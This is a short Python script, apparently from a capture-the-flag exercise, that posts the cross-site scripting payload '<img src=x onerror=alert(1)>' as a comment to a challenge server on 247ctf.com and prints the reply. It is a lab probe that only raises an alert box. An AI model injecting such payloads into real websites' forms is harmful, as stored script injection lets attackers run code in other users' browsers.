import requests

url = 'https://a91678fa6cce40f9.247ctf.com/'

res = requests.post(f'{url}/comment/1', data={
    'comment': '<img src=x onerror=alert(1)>'
})

print(res.text)